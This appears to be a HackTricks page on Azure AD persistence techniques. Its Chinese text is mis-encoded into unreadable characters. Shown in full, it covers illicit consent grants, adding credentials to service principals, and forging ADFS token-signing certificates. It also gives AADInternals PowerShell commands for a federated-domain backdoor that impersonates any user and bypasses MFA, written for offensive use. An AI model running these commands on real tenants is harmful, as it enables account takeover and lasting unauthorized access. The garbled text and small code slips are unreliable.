# Az - æŒä¹…æ€§

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

### éæ³•åŒæ„æˆæƒ

é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åœ¨ Azure AD ä¸­æ³¨å†Œåº”ç”¨ç¨‹åºã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥æ³¨å†Œä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆä»…é€‚ç”¨äºç›®æ ‡ç§Ÿæˆ·ï¼‰ï¼Œè¯¥åº”ç”¨ç¨‹åºéœ€è¦é«˜å½±å“æƒé™å¹¶è·å¾—ç®¡ç†å‘˜åŒæ„ï¼ˆå¦‚æœæ‚¨æ˜¯ç®¡ç†å‘˜ï¼Œåˆ™å¯ä»¥æ‰¹å‡†ï¼‰- ä¾‹å¦‚ä»£è¡¨ç”¨æˆ·å‘é€é‚®ä»¶ã€è§’è‰²ç®¡ç†ç­‰ã€‚å¦‚æœæˆåŠŸï¼Œè¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿè¿›è¡Œéå¸¸æœ‰æˆæœçš„**é’“é±¼æ”»å‡»**ã€‚

æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥æ¥å—è¯¥åº”ç”¨ç¨‹åºï¼Œå¹¶ä»¥æ‚¨çš„ç”¨æˆ·èº«ä»½ä¿æŒå¯¹å…¶çš„è®¿é—®æƒé™ã€‚

### åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¸»ä½“

é€šè¿‡å…·æœ‰åº”ç”¨ç¨‹åºç®¡ç†å‘˜ã€GA æˆ–å…·æœ‰ microsoft.directory/applications/credentials/update æƒé™çš„è‡ªå®šä¹‰è§’è‰²çš„ç‰¹æƒï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰åº”ç”¨ç¨‹åºæ·»åŠ å‡­æ®ï¼ˆå¯†é’¥æˆ–è¯ä¹¦ï¼‰ã€‚

å¯ä»¥**é’ˆå¯¹å…·æœ‰é«˜æƒé™çš„åº”ç”¨ç¨‹åº**æˆ–**æ·»åŠ å…·æœ‰é«˜æƒé™çš„æ–°åº”ç”¨ç¨‹åº**ã€‚

ä¸€ä¸ªæœ‰è¶£çš„è§’è‰²æ˜¯**ç‰¹æƒèº«ä»½éªŒè¯ç®¡ç†å‘˜è§’è‰²**ï¼Œå› ä¸ºå®ƒå…è®¸**é‡ç½®å…¨å±€ç®¡ç†å‘˜çš„å¯†ç **ã€‚

æ­¤æŠ€æœ¯è¿˜å¯ä»¥**ç»•è¿‡ MFA**ã€‚

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
* å¯¹äºåŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### è”åˆ - ä»¤ç‰Œç­¾åè¯ä¹¦

åœ¨æœ¬åœ° AD ä¸Šæ‹¥æœ‰ **DA ç‰¹æƒ**çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ›å»ºå’Œå¯¼å…¥å…·æœ‰éå¸¸é•¿æœ‰æ•ˆæœŸçš„**æ–°ä»¤ç‰Œç­¾å**å’Œ**ä»¤ç‰Œè§£å¯†è¯ä¹¦**ã€‚è¿™å°†å…è®¸æˆ‘ä»¬ä»¥ä»»ä½•æˆ‘ä»¬çŸ¥é“å…¶ ImuutableID çš„ç”¨æˆ·èº«ä»½ç™»å½•ã€‚

ä»¥ **ADFS æœåŠ¡å™¨ä¸Šçš„ DA èº«ä»½**è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºæ–°è¯ä¹¦ï¼ˆé»˜è®¤å¯†ç ä¸º 'AADInternals'ï¼‰ï¼Œå°†å…¶æ·»åŠ åˆ° ADFSï¼Œç¦ç”¨è‡ªåŠ¨æ»šåŠ¨å¹¶é‡æ–°å¯åŠ¨æœåŠ¡ï¼š
```powershell
New-AADIntADFSSelfSignedCertificates
```
ç„¶åï¼Œä½¿ç”¨Azure ADæ›´æ–°è¯ä¹¦ä¿¡æ¯ï¼š
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### è”åˆ - å—ä¿¡ä»»çš„åŸŸ

åœ¨ç§Ÿæˆ·ä¸Šå…·æœ‰GAç‰¹æƒçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥**æ·»åŠ ä¸€ä¸ªæ–°çš„åŸŸ**ï¼ˆå¿…é¡»ç»è¿‡éªŒè¯ï¼‰ï¼Œå°†å…¶èº«ä»½éªŒè¯ç±»å‹é…ç½®ä¸ºè”åˆï¼Œå¹¶é…ç½®è¯¥åŸŸ**ä¿¡ä»»ç‰¹å®šçš„è¯ä¹¦**ï¼ˆåœ¨ä¸‹é¢çš„å‘½ä»¤ä¸­ä¸ºany.stsï¼‰å’Œå‘è¡Œè€…ï¼š
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## å‚è€ƒèµ„æ–™

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ PDF ç‰ˆçš„ HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
